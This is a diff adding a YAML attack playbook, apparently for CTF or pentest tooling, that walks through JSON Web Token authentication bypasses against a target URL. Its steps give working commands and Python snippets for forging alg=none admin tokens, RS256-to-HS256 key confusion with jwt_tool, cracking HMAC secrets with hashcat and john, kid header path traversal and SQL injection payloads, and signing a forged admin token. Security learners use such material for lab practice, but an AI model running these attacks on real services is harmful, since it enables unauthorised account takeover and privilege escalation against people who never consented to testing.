@@ -1,0 +1,104 @@
+id: jwt-attacks
+name: "Web — JWT attacks (none / alg confusion / weak secret)"
+description: >
+  JSON Web Tokens are a CTF staple for auth bypass. The four common
+  weaknesses: `alg:none` accepted, RS→HS algorithm confusion, weak HMAC
+  secret crackable offline, kid header path traversal.
+tags: [web, jwt, auth-bypass, crypto]
+difficulty: medium
+
+inputs:
+  - name: target_url
+    description: "An endpoint that accepts the JWT (usually in Authorization: Bearer or cookie)."
+    required: true
+  - name: token
+    description: "A valid (low-priv) JWT to mutate."
+    required: true
+
+steps:
+  - id: decode
+    name: "Decode header + payload (no key needed)"
+    inline_command: "echo '<token>' | cut -d. -f1 | base64 -d; echo; echo '<token>' | cut -d. -f2 | base64 -d"
+    inputs:
+      token: "${token}"
+    notes: |
+      The header tells you `alg` (HS256 / RS256 / none / ES256...) and
+      optionally `kid` (key id). The payload tells you what claim you'd
+      want to change (typically `role`, `admin`, `user_id`).
+
+  - id: alg_none
+    name: "Try alg=none"
+    inline_command: |
+      # Modify header to {"alg":"none","typ":"JWT"}, payload as desired,
+      # signature empty.
+      python3 -c '
+      import json, base64
+      def b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
+      h = b64({"alg":"none","typ":"JWT"})
+      p = b64({"sub":"admin","role":"admin","exp":9999999999})
+      print(f"{h}.{p}.")'
+    notes: |
+      Bad JWT libraries accept `none` as valid (signature ignored). Always
+      worth a try — 5 second test.
+
+  - id: rs_to_hs_confusion
+    name: "RS256 → HS256 confusion (sign with the public key)"
+    inline_command: |
+      # Get the server's public key (often at /jwks.json, /.well-known/jwks,
+      # /api/v1/auth/key, or embedded in a JS bundle).
+      curl '<url>/.well-known/jwks.json' -o jwks.json
+      # Convert JWK → PEM with jwt_tool (or jwk2pem)
+      python3 -m jwt_tool '<token>' -X k -pk pub.pem
+    inputs:
+      url: "${target_url}"
+      token: "${token}"
+    notes: |
+      Bug: server's verify call uses the public key as a SYMMETRIC HMAC
+      secret because it's lazy about typing. Attacker signs with HS256
+      using the public key (which they have) and the server validates.
+
+  - id: weak_secret
+    name: "Weak HS256 secret — crack offline"
+    inline_command: |
+      echo '<token>' > token.txt
+      hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
+      # or john:
+      john --wordlist=/usr/share/wordlists/rockyou.txt token.txt
+    inputs:
+      token: "${token}"
+    notes: |
+      If alg is HS256/384/512, the entire token's signature is HMAC(secret,
+      header.payload). hashcat -m 16500 / john's hsec256 cracks it in
+      seconds against rockyou for weak secrets ("secret", "key", "jwt", etc.).
+    capture:
+      - var: jwt_secret
+        regex: '^([^:]+):(\S+)$'
+        match: first
+        groups: { hash: 1, secret: 2 }
+
+  - id: kid_path_traversal
+    name: "kid header path traversal / SQLi"
+    inline_command: |
+      # Some servers do: read_key(jwt.kid) without sanitization.
+      # Try: kid = ../../../../dev/null, sign with empty key
+      # Or: kid = ' UNION SELECT 'attacker-controlled-secret' --
+    notes: |
+      Rare but devastating. Tools: jwt_tool's --exploit (covers everything
+      above automatically). Always run `python3 jwt_tool.py <token> -M at`
+      for full attack tree.
+
+  - id: forge_admin_token
+    name: "Forge the high-priv token (once you have a working method)"
+    inline_command: |
+      python3 -c '
+      import jwt
+      tok = jwt.encode({"sub":"admin","role":"admin","exp":9999999999}, "<secret>", algorithm="HS256")
+      print(tok)'
+    inputs:
+      secret: "${jwt_secret}"
+
+references:
+  - title: "PortSwigger — JWT attacks"
+    url:   "https://portswigger.net/web-security/jwt"
+  - title: "jwt_tool"
+    url:   "https://github.com/ticarpi/jwt_tool"
